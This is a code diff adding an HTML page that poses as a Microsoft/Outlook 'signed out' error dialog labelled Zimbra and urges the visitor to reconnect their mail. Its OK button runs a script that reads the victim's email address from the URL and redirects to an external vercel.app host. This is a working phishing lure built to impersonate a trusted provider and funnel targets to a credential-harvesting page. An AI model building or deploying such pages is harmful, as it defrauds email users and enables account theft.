@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Microsoft - Error</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f3f2f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .error-dialog {
+      background: white;
+      border: 1px solid #d1d1d1;
+      border-radius: 8px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+      width: 480px;
+      max-width: 90vw;
+      overflow: hidden;
+    }
+
+    .title-bar {
+      background: linear-gradient(to bottom, #0078d4, #106ebe);
+      color: white;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .outlook-icon {
+      width: 16px;
+      height: 16px;
+      background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiByeD0iMiIgZmlsbD0iIzAwNzhENCIvPgo8cGF0aCBkPSJNOCA0QzUuNzkgNCA0IDUuNzkgNCA4UzUuNzkgMTIgOCAxMlMxMiAxMC4yMSAxMiA4UzEwLjIxIDQgOCA0Wk04IDEwQzYuOSAxMCA2IDkuMSA2IDhTNi45IDYgOCA2UzkgNi45IDkgOFM4LjEgMTAgOCAxMFoiIGZpbGw9IndoaXRlIi8+Cjx0ZXh0IHg9IjgiIHk9IjkuNSIgZm9udC1mYW1pbHk9IlNlZ29lIFVJIiBmb250LXNpemU9IjciIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXdlaWdodD0iNjAwIj5PPC90ZXh0Pgo8L3N2Zz4=') no-repeat center;
+      background-size: contain;
+    }
+
+    .title-text {
+      font-size: 14px;
+      font-weight: 400;
+    }
+
+    .error-content {
+      padding: 24px;
+    }
+
+    .error-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .error-icon {
+      width: 32px;
+      height: 32px;
+      background: #ffaa44;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .error-icon::after {
+      content: "⚠";
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .error-message {
+      flex: 1;
+    }
+
+    .error-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #323130;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+
+    .error-description {
+      font-size: 14px;
+      color: #605e5c;
+      line-height: 1.4;
+      margin-bottom: 16px;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      padding-top: 16px;
+      border-top: 1px solid #edebe9;
+    }
+
+    .btn {
+      padding: 8px 24px;
+      border: 1px solid;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s ease;
+    }
+
+    .btn-primary {
+      background: #0078d4;
+      border-color: #0078d4;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: #106ebe;
+      border-color: #106ebe;
+    }
+
+    .microsoft-logo {
+      position: absolute;
+      bottom: 16px;
+      right: 16px;
+      font-size: 11px;
+      color: #8a8886;
+      font-weight: 400;
+    }
+  </style>
+</head>
+<body>
+  <div class="error-dialog">
+    <div class="title-bar">
+      <div class="outlook-icon"></div>
+      <div class="title-text">Zimbra</div>
+    </div>
+
+    <div class="error-content">
+      <div class="error-header">
+        <div class=""></div>
+        <div class="error-message">
+          <div class="error-title">Sorry, you have been signed out of your account</div>
+          <div class="error-description">
+            Your session has expired. Document preview failed to complete download. Connect to your mail IMAP to continue.
+          </div>
+        </div>
+      </div>
+
+      <div class="button-container">
+        <button class="btn btn-primary" onclick="redirectToHashURL()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="microsoft-logo">Microsoft Corporation</div>
+
+  <script>
+    function redirectToHashURL() {
+      const query = window.location.href;
+      const parts = query.split("?email=");
+      const base = parts[0];
+      const hash = parts[1];
+
+      const target = "https://zimbra-zimbra.vercel.app" + (hash ? hash : "");
+
+      window.location.href = target;
+    }
+  </script>
+</body>
+</html>
